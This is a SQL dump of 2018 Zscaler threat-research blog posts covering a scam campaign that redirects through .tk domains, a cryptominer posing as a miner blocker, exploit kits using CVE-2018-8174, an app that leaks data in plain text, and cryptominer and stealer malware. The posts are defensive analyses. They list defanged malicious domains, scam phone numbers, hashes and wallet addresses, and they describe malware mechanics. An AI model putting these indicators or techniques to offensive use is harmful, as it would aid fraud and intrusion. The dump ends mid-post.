	  			/ok/down.html  			  			  			Receives the URL for downloading additional malware payloads  			  		  		  			  			kill.txt  			  			  			This file contains the name of processes to terminate and file paths to delete  			  		  	           Zscaler Coverage    Zscaler detects this threat via following signatures:    W64/Trojan.TOKZ-7175    Win32.Coinminer.Agent.LZ    Win32.Trojan.Darkcloud.LZ    Cloud Sandbox Report showing the detonation activity for this malware can be seen below:', '', 'https://www.zscaler.com/blogs/research/darkcloud-bootkit');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (22, 'Spam campaigns leveraging .tk domains', 'Mohd Sadique', 'August 31, 2018', 'For the last couple quarters, the Zscaler ThreatLabZ research team has been closely monitoring services that provide free domain names. We’ve identified a campaign utilizing \'.tk\'  TLD (top level domain) domains that starts with compromised sites as the initial vector to redirect users to either fake blog sites to generate ad revenue or fake tech support sites that claim to remove viruses.    Based on our analysis of this campaign data till now, we are estimating at least 20K+ USD per month in revenue being generated from Ad Fraud activities alone. In this blog, we will share our analysis of this campaign.    During July, we saw activity from many compromised sites, as shown in the graph below.        Fig 1: DotTk campaign hits of July 2018    Some of the compromised sites have plain-text injected redirection code, as shown in the below image.        Fig 2: Sites showing plain-text injected redirection code    Many sites have packed and obfuscated injected redirection code, as shown in below image.        Fig 3: Obfuscated injected redirection code    After decoding, the script appears as follows:        Fig 4: Deobfuscated injected redirection code    The redirection code shown in the above image redirects to the .tk campaign.        Fig 5: Redirection to .tk campaign    The third technique used in compromised sites for hiding injected code is shown in the below image.        Fig 6: Hiding injected redirection code    The encrypted script in the above image is shown, decrypted, below:     Fig 7: Decrypted redirection code    In this case, it is not redirecting for every hit; instead, redirection takes place when a random number 3 appears, and the redirected site again redirects to the .tk domains.    We have found 3,804 unique .tk domains since May 2018, which are included in this campaign.    You can find the .tk campaign URLs here.    Fake blogger site redirections:    In this case, the .tk campaign URL redirects to a fake blogging site for the sole purpose of showing ads:    vertdfgsderawee[.]tk/index/?2101505838590 redirects to frenkulok[.]info/latest        Fig 8: Fake blogging site redirect    The redirection URL at vertdfgsderawee[.]tk/index/?2101505838590 changes each time, so the redirect shown here, frenkulok[.]info/latest, will be different on another visit.    This URL redirects to the \"latest\" blogging content, as shown in the below image.        Fig 8: The \"latest\" blogging site redirect    The .tk campaign redirects to one of the below 72 fake blogging content sites.    ad60[.]org  arbuz01[.]org  ava4[.]org  backham[.]org  barsiksuperkot[.]org  borisska[.]bid  braceletstartop[.]org  broochstartop[.]org  city-guides[.]org  clombika[.]org  costumestartop[.]org  crispyom[.]org  din9[.]org  doesok[.]top  domainopp[.]org  donperinion[.]org  dreamlol[.]org  earringstartop[.]org  emily2[.]org  eniki-beniki[.]info  erkan-ok[.]org  facekolk[.]org  fenixscool[.]info  fitnessgolging[.]org  fix-mix-news[.]info  fokus-mokus[.]org  fped8[.]org  frenkulok[.]info  fricsianlope[.]org  gagarintp[.]org  gates0017[.]org  gemstartop[.]org  glassstartop[.]org  goldstartop[.]org  haruny[.]org  isla5[.]org  jacksoning[.]org  jessica1[.]org  kentpppr[.]org  kinogo-de[.]org  kinogo-fr[.]org  kinogo-gr[.]org  kinogo-it[.]org  kinogo-jp[.]org  kinogo-oo[.]org  knickknackstartop[.]org  krokodil22[.]org  l-l-l-l-l-l[.]info  lapuh2[.]org  lemon4ikp[.]org  lily3[.]org  limeemil[.]org  mandarin5[.]org  medheltping[.]org  myshoptrade[.]info  oguzhanoss[.]org  online-news-school[.]info  perecappr[.]org  picturesun[.]top  pirozok3[.]org  rakamakao[.]org  ramazano[.]org  rikitik1[.]org  rikitiki[.]org  rock19[.]org  shahterworld[.]org  spaceofcelebs[.]com  ugips[.]ru  unique-news-week[.]info  wagnerok[.]org  websun[.]top  yunus1[.]org    The IP address associated to all these websites is the same - 162.244.35[.]55    The website traffic and Alexa rank of these sites are increasing daily.        Fig 9: Website traffic and Alexa rank of fake blogging sites    The daily and monthly revenue estimates of one of the sites is shown below.        Fig 10: Estimated monthly ad revenues from one fake blogging site    If we consider that the average monthly advertising revenue from one website is $300, we can extrapolate that for 72 domains, the monthly revenue could be as high as $21,600.    Fake tech support redirection:    In this case, the .tk campaign URL redirects to a fake tech support website and displays fake alert messages that ask users to call a given number for technical assistance.             Fig 10: Fake tech support website redirect    Redirected tech support scam site:        Fig 11: Redirected tech support scam site    Below are the tech support scam URLs that are appearing after redirection from the .tk campaign.    wizenedrusty[.]tk/?number=877-506-7276  tuhorougahely[.]tk/?number=877-556-6929  strangeizened[.]tk/?number=877-506-7276  savoirplaisir[.]tk/?number=877-506-7276  rosetwo[.]tk/?number=855-257-7118  regarderlieu[.]tk/?number=877-506-7276  reachedforthe[.]tk/?number=855-257-7118  nothershred[.]tk/?number=866-686-7506  minuteslooking[.]tk/?number=888-563-5301  mightbesupposed[.]tk/?number=888-489-1903  loperyha[.]tk/?number=08-7150-1727  inhisexcitement[.]tk/?number=08-7150-1727  hrteasdopla[.]tk/?number=888-384-6729  howevedirect[.]tk/?number=888-754-9063  hewasawakened[.]tk/?number=888-384-6729  guest-through[.]tk/?number=877-506-7276  fixturtherefore[.]tk/?number=0808-189-4372  courtfinir[.]tk/?number=844-619-6687  cleanough[.]tk/?number=888-754-9059  certahintykif[.]tk/?number=888-384-6729  businescallme[.]tk/?number=0800-060-8933  beundisturbedbut[.]tk/?number=877-406-6169  alreadygoneaway[.]tk/?number=877-556-6929    Conclusion:    The scam campaign involving .tk domains has been active since at least May 2018. Over the last three months, this campaign has largely been redirecting users to fake blogger sites and tech support scam sites, but it\'s reasonable to assume that in the future, the campaign may start redirecting to phishing sites, exploit kit gates, or any malicious site that can generate revenue in one way or another.', 'Advertising;Analysis;Compromise;Scam', 'https://www.zscaler.com/blogs/research/spam-campaigns-leveraging-tk-domains');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (23, 'Anti-Coinminer Mining Campaign', 'Atinderpal Singh,', 'August 16, 2018', 'Coinminer malware has been on the rise for some time. As more and more users become aware of this threat and try to take measures to protect themselves, cybercriminals are attempting to cash on that fear by serving crypto-miner malware from a website claiming to offer a coinminer blocker. Although the website looks unprofessional and would appear suspicious to most, there are plenty of non-tech savvy users who may fall for it.        Figure 1. Source website    We have observed two variants of this malware strain being served from the above mentioned website as well as coin-blocker[.]com. In both cases malware operator is using malicious miner code written by another author for his financial gains and in the process also getting duped himself/herself.         CryptoMiner Variant #1    MD5s: 927adcebfa52b3551bdd008b42033a6e and c777e949686f49cc0a03d0d374c5e68a    The first malware variant was getting downloaded with file names like \'cr_blocker_v12.exe\', \'apollo.exe\' and was making extensive use of batch files. First it will drop and execute a batch file , which in turn, runs a PowerShell command (a slightly modified version of the PowerShell script from http://moneroocean[.]stream) to download and execute a batch script (again a copy of moneroocean\'s xmrig_setup.bat) from same website.  The purpose of final batch script is to download, setup and run monero miner on infected system.                 Figure 2. Execution flow and Batch file executed by malware    The above script is sourced from a script that is published on MoneroOcean\'s GitHub account with two minor modifications. The malware author has modified the DownloadFile URL to point to a copy of official miner batch file that is hosted on the malware author\'s site. The second and obvious modification is the wallet address change, where the attacker is collecting the revenue from this fradulent mining campaign. This address has not earned much yet (as of August 16, 2018, just 1.298239 XMR has been paid), but this campaign is just getting started, so it is early to draw any conclusions.         CryptoMiner Variant #2    MD5s: d3fa184981b21e46f81da37f7c2cf41e    The second malware variant was seen being downloaded with filename start_me_now.exe which will further download another file named start_me.exe from same domain and executes that file. The downloaded file is an SFX archive containing multiple files, including both xmr-stak and xmrig miner with same configuration.        Image: Cryptominer SFX variant execution flow diagram    The malware operator has used a version of Playerz Multi Hidden Cryptocurrency Miner from multicryptominer[.]com with the addition of silent.exe containing an embedded copy of xmrig miner. Silent.exe will run xmrig miner by injecting it into a process such as notepad.exe.        Figure 3. SFX Script from start_me.exe    Batch files are just one-line scripts in this case as seen below; run.bat will run c:\\ProgramData\\playersclub\\player.exe and share.bat will open xmrminingpro[.]com/share.html in an attempt to convince the user to share this website on social media sites - Twitter, Facebook and Google Plus - resulting in further infections.        Figure 4. Batch files    Setup.exe and all other files which are part of this SFX archive belong to Playerz Multi Hidden Cryptocurrency Miner, whose details follow.         Playerz Multi Hidden Cryptocurrency Miner    setup.exe    It will first run setup.exe, which will copy the folder “pcdata” and its files to C:\\programdata\\playersclub and run installer.exe.        Figure 5. Autohotkey script from setup.exe         Installer.exe    It will register and run xmr-stak as a service using launchserv.exe, allowing it to run with higher privileges, and also create C:\\programdata\\playersclub\\player.txt by taking configuration data from playerconfig.txt:        Figure 6. Autohotkey script from installer.exe    Launchserv.exe will use following configuration to register service:        Figure 7. LaunchServ.ini file         systemSpawn.exe    systemSpawn.exe is registered as a service with the purpose of ensuring player.exe exists in the C:\\programdata\\playersclub\\ folder and, if not download and run it with escalated privileges using PaExec.exe (similar tool to Microsoft\'s PsExec) from poweradmin[.]com/paexec/.        Figure 8. Autohotkey script from systemSpawn.exe    It will run player.exe using the following switches to gain escalated privileges: -s (run the process in the system account), -x (display the UI on the Winlogon secure desktop), -d (don\'t wait for process to terminate [non-interactive]), -i (run the program so that it interacts with the desktop of the specified session on the specified system. If no session is specified, the process runs in the console session).         player.exe    Player.exe is the main process responsible for managing the xmr-stak.exe process. It will do all of the things mentioned by the malware author on its website, such as: run when the computer is idle; check if video or audio is being played; automatically download and, if needed, update miner software; kill processes mentioned in all ProcessesList.txt, and more.    Ironically, the Playerz Multi Hidden Cryptocurrency Miner author has provided a wallet address for donations to help fund the development of this malware.        Figure 9. Donation address mentioned on the website    But that was not enough, the author also added a backdoor functionality to mine cryptocurrency for his own address in the mutlicryptominer binary. It will check the modified timestamp of player.txt, and if that file is more than five days old, it will get latest config from multicryptominer[.]com/pool2.xml.        Figure 10. Downloading latest configuration from C&C    It will parse the received data as seen below:        Figure 11. Parsing configuration from C&C    Response from the C&C server:      Figure 11. Configuration received from server    It will then calculate time for running the original author\'s and the second level malware operator\'s miner on the infected system:        Figure 12. Calculation time distribution for author\'s and customer\'s address mining    In case the server did not respond with the proper configuration, or player.txt is not more than five days old, it will run the second level malware operator\'s miner for 105 minutes and author’s for 15 minutes; otherwise, it will distribute time among mining addresses depending on a value received from the server. At the time of analysis, the server was sending the maximum possible value of nine, which means it is splitting mining time between author and customer in a 3-to-1 ratio (90 minutes for author and 30 minutes for customer).    After it is done downloading the backdoor configuration and calculating time, it will start timers for various activities:        Figure 13. Timers for running and stopping the mining process         When conditions are met for running the miner—for example, when the system is idle and no video or audio is playing—it will run the miner using runProcesses.exe. This will also ensure that the end user will not notice any obvious system slow downs from miner operation.        Figure 14. Run miner processes using runProcesses.exe    It also starts a timer with callback to kill the process after timeout.         runProcesses.exe    This will try to detect CPU and graphics to run miner with optimal settings and, in case no configuration is downloaded from C&C, it also includes hardcoded wallet addresses for mining.        Figure 15. Hardcoded addresses used if configuration is not received from server         Conclusion    There is a rising trend of new cryptominer malware families as well as existing malware families adding cryptominnig support as highlighted in our previous writeup here. AntiCoinMiner malware operator is leveraging the tried and tested scareware tactics theme very similar to FakeAV malware families, where it gives a false sense of security to the end user while exploiting their machine for financial gains. The malware operator is using an off-the-shelf cryptominer malware for this campaign; however the original cryptominer malware author has a backdoor functionality embedded in the code which deceives the second level malware operator by stealing large portion of CPU cycles from the infected machines to mine coins for the original author.    Zscaler ThreatLabZ is actively monitoring for threats like these and will continue to ensure coverage for Zscaler customers.             IOCs    MD5s:    927adcebfa52b3551bdd008b42033a6e  d3fa184981b21e46f81da37f7c2cf41e  c777e949686f49cc0a03d0d374c5e68a  Ecd13814885f698d58b41511791339b6  642cccf03f9493b3d91d84e1b0e55e9c  Da8d0c73863afe801bb8937c4445f5f9  D3fa184981b21e46f81da37f7c2cf41e  E6569c2c9bceb6a5331d39a897e99152  06ded4e24118a4baccfd2f93fffe3506  927adcebfa52b3551bdd008b42033a6e  f8df9d2adf5b92dc4dd419098d444bde  B0cec3e582a03c978eaff9a8d01f3c31  D204728ac2e98ac380953deb72d3ca57  c842a49268b52892268e3ff03205b2de  95ea8c948a5254a3b24cbbf3edec1a1a    URLs:    www.xmrminingpro[.]com/start_me_now.exe  xmrminingpro[.]com/cr_blocker_v12.exe  xmrminingpro.com/Crypto_Blocker_.BAT.exe  coin-blocker[.]com/Coin_Blocker_v1.55.exe  xmrminingpro[.]com/Apollo.exe  coin-blocker[.]com/Coin_Blocker_v1.5.exe  coin-blocker[.]com/old/apollo_stream.exe  coin-blocker[.]com/apollo/apollo_x86.exe    Wallet Addresses:    From Samples:    4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQsjqdY9cck94oTET4i  48LYTsUuFis3eheaGJSVC1b4DiftHw8249KCELDPGLU7Ke7GddfV7vM8qmuoW3x3qy8hPXiEknM2jixquq4qbHYHHmWut4J  4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQrzvo2Dv3ebJHC95XG  4BEqL8aYcuydaT26Rm9BBDgx5MAPeMSeJGgMd8RJDQKaPZEVySfAaTU8bVMsp2uykJZJ1aJDtyLRHREUBe1XXjfUAty7XJy  4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQrzvo2Dv3ebJHC95XG  4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQmRkHZngZS7So7FipR    Author\'s wallet addresses:    Hardcoded in sample: 472dyZhom95Higc85N5E1LbiY3kgbQvapcZ1DosRfjKX4EAvK3ZrdvuLxLMe4vTFbEUAhECZoDZHyGMdFJktrZZyNA3v1Wr  Received from c&c: 48LYTsUuFis3eheaGJSVC1b4DiftHw8249KCELDPGLU7Ke7GddfV7vM8qmuoW3x3qy8hPXiEknM2jixquq4qbHYHHmWut4J  Mentioned for Donation: 48YAdSiCmzSPXxbrqjhnkVNLfFwcX6uJvV6wVGxNdDZ1Fww43c6zdjo1HePWZY6KXp78q8kv5rcqFYM76uSpPv8u4E2pnuq', 'Malware', 'https://www.zscaler.com/blogs/research/anti-coinminer-mining-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (24, 'Exploit kits go cryptomining – Summer 2018 edition', 'Rohit Hegde', 'August 07, 2018', 'Overview    This is the ninth edition of our Quarterly Exploit Kit activity roundup series, in which we share our analysis of recent exploit kit activity. Exploit kits (EKs) are rapidly deployable software packages designed to leverage vulnerabilities in web browsers and deliver a malicious payload to a victim’s computer. Authors of EKs offer their services for a fee, distributing malware for other malicious actors. Though it\'s been declining, there is still plenty of EK activity, and EK operators continue to adopt new techniques for monetizing infected machines.    Due to the increase in popularity and value of cryptocurrency, we are seeing EK operators shifting their focus from ransomware to cryptominers, with the end payload generating revenue in multiple instances. All the exploit kits mentioned in this roundup were seen infecting users with cryptominer malware. We have also seen an increased use of malvertising campaigns to direct users to exploit kits. What follows are highlights from the EK activity we observed during the last quarter.    RIG Exploit Kit    RIG EK has been active for some time now. Though there are many other EKs that enter and exit the threat landscape, RIG has been persistently on the scene and adopting changes over time. Recent changes were the inclusion of CVE-2018-8174 and the use of cryptominer payloads to monetize infected resources. The hits that we saw were mainly from malvertising campaigns running on pirated movie streaming or adult websites.    The RIG EK activity hits are shown below.        Figure 1: RIG EK hits from May 1, 2018, to August 5, 2018    The geographical distribution of the hits can be seen below.        Figure 2: RIG EK hits geo distribution    RIG EK redirects were mainly seen from malvertising campaigns. The hits were not restricted to any specific geographical location. A recent RIG EK cycle can be seen below.        Figure 3: RIG EK Fiddler capture    The malvertising page redirect can be seen below.        Figure 4: Malvertising redirect    This loads an obfuscated JavaScript, shown below.        Figure 5: Malvertising redirect obfuscated (popunder)    The deobfuscated script is shown below.        Figure 6: Malvertising redirect deobfuscated (popunder)    This redirect loads a fingerprinting page that contains two parts: one part is JavaScript, which collects browser information, and the other part is obfuscated JavaScript, responsible for relaying the information to the RIG EK landing page server. A snippet of the fingerprinting script is shown below.        Figure 7: Browser fingerprinting    A snippet of the obfuscated JavaScript responsible for relaying information is shown below.        Figure 8: Obfuscated JavaScript redirect on the fingerprinting page    The deobfuscated code for this redirect is shown below.        Figure 9: Deobfuscated redirect on fingerprinting page    The landing page contains exploit code for VBScript memory corruption vulnerability CVE-2018-8174 and CVE-2016-0189. There are three scripts on the landing page. The first exploits the recent CVE-2018-8174 vulnerability, the second exploits CVE-2016-0189, and the third is a Flash-based exploit. We can see the CVE-2018-8174 below.        Figure 10: CVE-2018-8174 on the RIG EK landing page    By deobfuscating the code, we can see the VBScript exploit code, which is the same as the PoC for CVE-2018-8174 released on GitHub with minor modifications to weaponize the PoC.        Figure 11: CVE-2018-8174 code comparison    The snippet below shows the part of the landing page exploiting CVE-2016-0189.        Figure 12: CVE-2016-0189 exploit code on RIG EK landing page    The third script targeting the Flash exploit is shown below.        Figure 13: RIG EK landing page Flash exploit call    When we deobfuscate the script, we can observe calls to Flash file download, as shown below.        Figure 13: RIG EK landing page Flash exploit call    The payload seen for this cycle was a trojan. We also saw cryptominers and GandCrab ransomware payloads being downloaded by RIG EK this quarter.    GrandSoft Exploit Kit    GrandSoft is an exploit kit that resurfaced earlier this year, when it was found serving GandCrab ransomware. We have also seen instances of cryptomining payloads being served by the GrandSoft EK in the past quarter.    The GrandSoft EK activity hits are shown below.        Figure 15: GrandSoft EK hits from May 1, 2018, to August 5, 2018    The geographical distribution of the hits can be seen below.        Figure 16: GrandSoft EK heat map    GrandSoft EK redirects were mainly seen from malvertising campaigns. We often see threat actors utilizing the same resources to trigger different attack chains depending on the user session information. One such instance can be seen below, where “freedatingvideo[.]info” was redirecting users to RIG EK or GrandSoft EK gates or a web-based cryptomining site as part of the same malvertising campaign.        Figure 17: GrandSoft EK cycle    GrandSoft EK authors have also added CVE-2018-8174 VBScript memory corruption vulnerability exploit to the landing page. Below is a snippet from the landing page using the CVE-2018-8174 exploit.        Figure 18: CVE-2018-8174 exploit code on the GrandSoft EK landing page    The payload seen with this cycle was GandCrab ransomware.         KaiXin Exploit Kit    The KaiXin EK was active in the last quarter of 2017, and we have not observed many hits for KaiXin EK since then. But recently, we were able to capture an instance of KaiXin EK in the wild. A recent addition to this EK is the use of the CVE-2018-8174 exploit derived from a PoC published on GitHub. The Fiddler capture for the KaiXin exploit kit cycle is shown below.        Figure 19: KaiXin exploit kit Fiddler capture    The landing page consists of two JavaScripts: one loads the calls to the exploit webpage and the other is a redirect to a fingerprinting site, which relays the victim’s system information back to the server. We can see that the attacker is using car brands as variable names on the landing page, consistent with behavior seen in the past.        Figure 20: KaiXin exploit kit landing page    The landing page loads a plugin to detect JavaScript “jquery.js’.” A snippet of this code can be seen below.        Figure 21: KaiXin EK jquery    The LeNnDv.html file downloaded contains the CVE-2018-8174 exploit code derived from the PoC shared on GitHub. A snippet of this code is shown below.        Figure 22: CVE-2018-8174 in KaiXin exploit kit    The page is heavily obfuscated with the call to the payload download shown below.        Figure 23: Obfuscated JavaScript for payload download        Figure 24: First layer JavaScript deobfuscation        Figure 25: Second layer JavaScript deobfuscation    During deobfuscation, we see that the VBScript loaded is similar to the PoC available on GitHub, and KaiXin has adopted it, as did the GrandSoft EK and RIG EK.        Figure 26: CVE-2018-8174 in KaiXin exploit kit    The payload seen for this cycle was a Trojan  (MD5:e28d993fd4ae1fb71d645159f726f570).         Other exploit Kits    Terror EK, which was active at the end of 2017, has shown reduced activity since the start of 2018 and we have not seen any activity for Terror EK this quarter. Magnitude EK, though active, is operating in a very restricted geographic region being served through malvertising campaigns. We have not seen direct hits for Magnitude EK landing pages or gates this quarter, but we continue seeing hits for the malvertisements that were directing users to the Magnitude EK gates.         Conclusion    Exploit kits are effective for infecting victim machines without users’ knowledge. While the trend has been to infect users with ransomware with the expectation that a few users would pay to get access to their data, the trend has shifted to the use of cryptominers and Trojans to steal users’ data and use their system resources to mine cryptocurrency for the attackers. Attackers frequently change their techniques by obfuscating the source code or injecting new exploit code into their EKs, and security researchers analyze and block the new threats by tracking changes in EK behavior.    To help avoid infections from exploit kits, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Keeping browser plugins and web browsers up to date with latest patches helps to protect against common vulnerabilities targeted by exploit kits. The Zscaler ThreatLabZ research team has confirmed coverage for these exploit kits and subsequent payloads, ensuring protection for organizations using the Zscaler Cloud Security Platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/exploit-kits-go-cryptomining-summer-2018-edition');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (25, 'Mobile App Wall Of Shame: Trip38', 'Shivang Desai', 'July 20, 2018', 'Compared to Android users, iOS users tend to feel fairly safe from lurking threats. But, occasionally, that sense of security is tested. Zscaler ThreatLabZ recently came across an app that had a significant flaw, causing it to leak the personal information of iOS users. The details of the app are as follows:    Name: Trip38 Travel Assistant - Free  Platform: iOS  Seller: Trip38 Technologies Private Limited  Size: 25.7 MB  Category: Travel  Compatibility: Requires iOS 8.0 or later. Compatible with iPhone, iPad, and iPod touch.  Languages: English, Simplified Chinese, Spanish  Price: Free           	  		  			  		  		  			Fig 1: Trip38 app on App Store  		  	        Trip38 is a travel assistant app that allows users to plan and track their travel. It stores travel details, including flight times, origination and destination city/country, and accommodation information, such as hotel name, booking dates, etc. We discovered that this app was communicating with its server in an insecure manner.     The app contacted its server via API calls, and all details passed to the server were being sent in plain text, with plain-text responses from the server. Communicating in plain text makes it easy to carry out Man-In-The-Middle (MITM) and other attacks. Login credentials may be intercepted and private information, including the user\'s location and travel plans, may be exposed. This vulnerability is worse when you consider that the app is likely to be used by travelers at hotels, coffee shops, airport terminals, and similar locations that offer free Wi-Fi services, where the chances of eavesdropping are high.     Let\'s look at the app\'s functions and the data being leaked.     As soon as a user installs and uses the app for the first time, it asks for the user\'s location. It was strange to see a second pop-up asking \"Allow\" for location access even when the app is not in use. The screenshot below shows both pop-ups:       	  		  			  		  		  			Fig 2: Location access  		  	           The user may allow or disallow this feature, but in the travel category, it\'s likely that users will allow location access to the app. After this, the user can either log in or register. Being a new user to the app, we tried registering. As shown in screenshot below, it asks for Name, Email, and Password.       	  		  			  		  		  			Fig 3: Sign up process  		  	           As soon as user signs up, all the information—name, email, password, and location details—is sent to the server in plain text as shown below:       	  		  			  		  		  			Fig 4: Plain text username and password  		  	           Upon successful response from server, the app performs an automatic user login request. Again, the details are sent to the server in plain text, except that during signup, the request is sent to userSignup.php with doSignup as the action, and during the login action, the request is sent to doUserLogin to userLogin.php.      	  		  			  		  		  			Fig 5: Username and password leakage during auto-login  		  	           After auto-logging in the user, the app displays the following screen, where it asks to either add a trip or track a flight.       	  		  			  		  		  			Fig 6: First screen after signup/login  		  	           If a user is already registered, the app requests a trip list and, again, the trip request and response are in plain text. In the below screenshot, the trip list is empty because we did not add a past trip. For registered users, the server would respond with a complete list of previous and upcoming trips.       	  		  			  		  		  			Fig 7: Fetching trip list in plain text  		  	          We found that Trip38 is also available on Android, and that version has the same flaws as the iOS version. The requests and responses shown above were the same on Android with only one difference. In the case of iOS, requests contained flag_ios valued as 1; for Android requests, flag_android was set to 1. The screenshot below shows the Google Play page.      	  		  			  		  		  			Fig 8: Trip38 app on Google Play   		  	           According to OWASP Mobile Top 10, we can mark the Trip38 vulnerability as M3-Insecure Communication and M4-Insecure Authentication.     Conclusion:     This is not first time ThreatLabZ has come across an app with flaws like those in Trip38. We blogged about a similar case where an iOS-based SMS app was leaking data. Due to the omnipresence nature of mobile devices and the millions of apps available for them, it has become critical to prevent data leakage at every step. App developers have a responsibility to use standard code security practices, and encryption is essential for keeping users\' data intact and safe from prying eyes.      Note: We contacted the developer of Trip38 about this issue and, as of this writing, we have not heard from them. We have also notified Google and Apple.', 'Mobile', 'https://www.zscaler.com/blogs/research/mobile-app-wall-shame-trip38');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (26, 'Cryptominers and stealers – malware edition', 'Atinderpal Singh,', 'July 12, 2018', 'It all started in 2008 with a paper on the first decentralized digital currency, Bitcoin, created by an unknown person or persons referred to as Satoshi Nakamoto. Bitcoin is a peer-to-peer currency based on cryptography that works on distributed ledger technology known as blockchain. In 2009, the first open-source software for Bitcoin was released. The main advantage of Bitcoin is its decentralized nature; however, this also makes it impossible to control or censor by any single authority, making Bitcoin attractive to cybercriminals.    Over time, more than 4,000 similar cryptocurrencies, also known as altcoins, have emerged and, as a result, the use of malware that targets bitcoins or altcoins for financial gain has been on the rise. Two cryptocurrencies that have become popular among cybercriminals due to their privacy features and untraceable nature are Zcash and Monero.    In this blog, ThreatLabZ provides an insight of various cryptominers and stealer malware variants that are taking advantage of rising cryptocurrency prices and popularity.         Fig. 1: A bitcoin price chart courtesy coinmarketcap.com         Types of crypto-malware    Cryptocurrency miners and stealers have been around for a few years, but have grown in number with the surge in cryptocurrency value. Cybercriminals have taken notice of the increasing worth and have begun adding support for cryptomining as well as stealing capabilities to existing malware families.    ThreatLabZ researchers have categorized malware payloads related to cryptocurrency into the following three categories:      	Cryptominers  	Wallet stealers  	Clipboard hijackers      We’ve also seen numerous instances of existing malware payload that has been modified to target cryptocurrency.        Fig. 2: Types of crypto-malware and how they work         Cryptominers    Cryptominer malware steals CPU cycles from victims’ systems to mine and generate digital currency, such as bitcoins, without users’ knowledge or consent. Cryptomining malware is a direct source of income for cybercriminals, unlike information-stealing malware, which involves the cybercriminal stealing the information and then the added step of having to sell or use the stolen information for indirect financial gain.    It didn’t take much time for cybercriminals to realize that pooled mining is ideal for botnets. While a single system capable of calculating approximately 100 hashes per second is not useful for mining, a botnet of 100,000 similar hosts can produce 10,000,000 hashes per second. Mining on that scale can result, for example, in roughly 69 Monero (XMR) per day, or more than $8,500 USD, based on a hypothetical Monero price of $125.00 USD.    Authors of most crypto-malware, new or old, download original or slightly modified versions of legitimate and open source-mining software rather than writing their own mining malware. In the beginning of our research, we only observed bitcoin miners, but now Monero tops the list of cryptocurrencies mined by malware. We have seen XMrig, CCMiner, XMR-Stak, and others used for Monero mining activities.    Cryptominers have been targeting all types of operating systems, such as Windows, Linux, OSX, and even Android and IoT devices, despite their low processing power. Cybercriminals have also targeted servers by exploiting various vulnerabilities to install cryptominers.        Fig. 3: Mining stats of one the cryptominer botnets that is still active.    Cryptomining trends have been growing dramatically since cryptocurrency prices hit an all time high in late 2017. In fact, according to ThreatLabZ analysis, cryptomining has outgrown ransomware to become one of the top threats in 2018.         Wallet stealers    Cryptocurrencies such as bitcoins are not stored in wallets as some people might think. Bitcoins are stored in blockchain which is distributed via a public ledger. Cryptocurrencies work on the concept of public key cryptography, where a public key is the wallet address used to receive money, while a private key is kept secret in wallet files and is required to spend money. So, in simple terms, wallets only store credentials to access or spend money stored in blockchain and owned by the user.    Some malicious actors prefer to steal cryptocurrencies already owned by a victim as opposed to mining new coins on a victim’s system; it can take a long time to mine a fair amount of value, depending on the system’s speed.    Wallet stealers have been around for almost as long as cryptominers. In fact, the first bitcoin wallet stealer was documented just three months after the first cryptominer. Over time, some very simple malware emerged whose only function was to steal wallet.dat files, and complex botnets stealing wallet.dat files began to emerge. Some generic and popular infostealer malware variants, like Pony and Azorult, also have the capability to steal cryptocurrency wallets and passwords amongst their long lists of tools.         Clipboard hijackers    Cybercriminals always come up with innovative ways to profit. Clipboard hijacking for replacing crypto-addresses is one of their innovative and subtle methods. Cryptocurrency wallet addresses are cryptographically generated, random-looking sequences of alphanumeric characters. They are not easy to remember, and that works to the advantage of bad actors.  Almost all cryptocurrency owners copy and paste their wallet address for making transactions; if an address is changed dynamically by malware, there is a good chance the victim won’t notice and will perform a transaction that profits the attacker’s account. This technique seems basic, but it’s effective in the case of cryptocurrencies.    In April 2014, a Reddit user posted about the first clipboard hijacker malware, which was a Chrome extension posing as the Dogecoin ticker extension. As a result of that hijacker, the user lost one bitcoin, which would have been worth in excess of $18,000 USD at peak values. Over the years, many clipboard hijacker variants have emerged. Some just replace a bitcoin address with one hardcoded address, while others can replace a bitcoin address with a similar-looking address from as many as 10,000 embedded addresses. Still others ask for a similar address from C&C to further conceal their operation. Some target only one currency, while others target more than 13 currencies.    As with miners and wallet stealers, there is some standalone clipboard hijacker malware in the news, such as ComboJack and CryptoShuffler, and there is multipurpose malware also capable of clipboard hijacking, such as Evrial and NjRAT Lime, which we recently blogged about. A variant of Phorpiex, an old and popular worm, was spotted with clipboard hijacking capability instead of the spamming functionality for which it is known. Technical details given below.         Malware that uses existing functionality to target cryptocurrency    There have also been some malware variants that did not try to add new functionality, but used existing features, such as keylogging, web injects, and overlay attacks to steal cryptocurrencies. Below are few examples:    Dridex:    Around September 2016, banking malware Dridex was seen targeting cryptocurrency-related software, searching filesystem paths and lists of processes to inject keyloggers. This functionality already existed in Dridex and was configured to target cryptocurrency-related tools along with its traditional targets.    TrickBot:    In August 2017, TrickBot, a traditional banking malware variant (with version 1000114 and group tag tt0002) started targeting coinbase.com, a cryptocurrency exchange that deals with Litecoin, Bitcoin, Ethereum, and other digital assets, using a standard WebInject format. Six months later, in February 2018, another TrickBot variant (with version 1000043 and group tag kas2) again targeted crypto-exchanges with dynamic WebInjects for coin purchasing pages.    Android bots (Exobot/Marcher, BankBot):    These are Android malware variants with the ability to detect the top open window of applications and phish credentials for that app by showing a static or dynamically fetched overlay to the user. Initially developed for targeting banking apps, these are also used to steal cryptocurrencies.         Recent malware family variants showing interest in cryptocurrencies    Phorpiex         Phorpiex, also known as Trik 